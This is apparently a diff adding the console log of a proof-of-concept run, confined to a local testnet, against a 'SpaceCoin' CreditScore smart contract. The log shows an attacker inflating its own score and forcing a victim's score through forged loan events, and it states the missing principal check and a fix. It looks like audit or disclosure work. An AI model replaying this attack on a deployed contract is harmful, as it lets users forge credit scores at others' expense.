@@ -1,0 +1,41 @@
+======================================================================
+  SpaceCoin F2 — CreditScore Credit Score Manipulation PoC
+  CWE-284: Improper Access Control (missing principal validation)
+======================================================================
+
+[*] Starting local Anvil testnet ...
+[*] Anvil running on http://127.0.0.1:8546 (PID 22140)
+[*] Running forge script: script/PocCreditScoreManipulation.s.sol
+
+======================================================================
+  SpaceCoin — F2: CreditScore.verifyQueryResult Untrusted Prover PoC
+======================================================================
+
+  [deploy] CreditScore: 0x5FbDB2315678afecb367f032d93F642f64180aa3
+  --- ATTACK 1: Inflate attacker score (no real loans) ---
+  [pre]  attacker score: 0
+  [call] verifyQueryResult(FUND_LOAN, attacker)  ->  score initialized to 300
+  [mid]  attacker score: 300
+  [call] verifyQueryResult(REPAY_LOAN, attacker) x10  ->  +10 points
+  [post] attacker score: 310
+  --- ATTACK 2: Tank victim score (victim has no loans at all) ---
+  [pre]  victim score: 0
+  [call] verifyQueryResult(FUND_LOAN, victim)  ->  victim score forced to 300
+  [call] verifyQueryResult(REPAY_LOAN, victim) x10  ->  victim boosted to 310
+  [call] verifyQueryResult(EXPIRED_LOAN, victim) x5  ->  -10 points (5 x -2)
+  [post] victim score: 300
+  === ATTACK CONFIRMED ===
+  Root cause: verifyQueryResult accepts any proverContract address.
+  No check on queryDetails.principal -- any caller fakes any loan event.
+  Fix: require(isAuthorizedPrincipal(queryDetails.principal))
+  ==========================
+  ==========================
+  ==========================
+
+======================================================================
+  RESULT: VULNERABILITY CONFIRMED
+  Both attacks executed without any legitimate loan activity.
+======================================================================
+
+[*] Shutting down Anvil ...
+[*] Done.
